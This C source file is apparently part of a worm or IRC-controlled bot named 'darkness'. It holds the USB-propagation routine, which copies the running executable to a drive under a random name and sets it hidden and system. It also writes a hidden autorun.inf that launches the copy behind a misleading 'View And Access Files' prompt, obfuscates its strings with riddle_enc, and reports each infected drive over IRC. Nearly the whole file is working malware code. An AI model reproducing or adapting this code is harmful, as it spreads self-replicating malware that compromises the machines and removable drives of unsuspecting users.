#include "infect.h"
#include "mylib.h"
#include "irc.h"

#include <windows.h>

int
GetDarknessPathData
(struct darkness_d *darkness) {
    if(darkness->drive_letter) {
       sprintf(darkness->binary_name,riddle_enc("+j4k~k"),GetRandomNumber()); // %d.exe
       sprintf(darkness->binary_path,riddle_enc("+i@b+y"), // %c:\%s
           darkness->drive_letter,darkness->binary_name);
       sprintf(darkness->autoexec,riddle_enc("4rIkp„ƒ~„}=x}u"),darkness->drive_letter); // %c:\autorun.inf
    }
    return(!darkness->drive_letter ? 0x0 : 0x1); 
}

void 
CreateAutoExecFile
(struct darkness_d *darkness) {
    HANDLE hFile;
    unsigned long BytesWritten;
    char buf[0x200];
    sprintf(buf,
        "[autorun]\r\n"
        "shellexecute=%s\r\n"
        "action=View And Access Files On My Storage Device\r\n",
        darkness->binary_name);
    hFile=CreateFile(darkness->autoexec,FILE_ALL_ACCESS,0x0,NULL,
         CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
    WriteFile(hFile,buf,strlen(buf),&BytesWritten,NULL);
    CloseHandle(hFile);
}

void 
InfectDrive
(char cDriveLetter) {      
    struct darkness_d darkness;
    char buf[0x40];
    darkness.drive_letter=cDriveLetter;
    GetModuleFileName(NULL,darkness.main,sizeof(darkness.main));
    if(!GetDarknessPathData(&darkness) ||
       !CopyFile(darkness.main,darkness.binary_path,0x1))
       return; 
    SetFileAttributes(darkness.binary_path,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
    CreateAutoExecFile(&darkness);
    sprintf(buf,riddle_enc("ˆWŠMv›“’¡’‘M™œŽ™M‘’£–’[MU0^^R 0MZkM0^^R 0V"), // [*] Infected local device. (11%s -> 11%s)
         darkness.main,darkness.binary_path);
    IrcSend(buf);
}
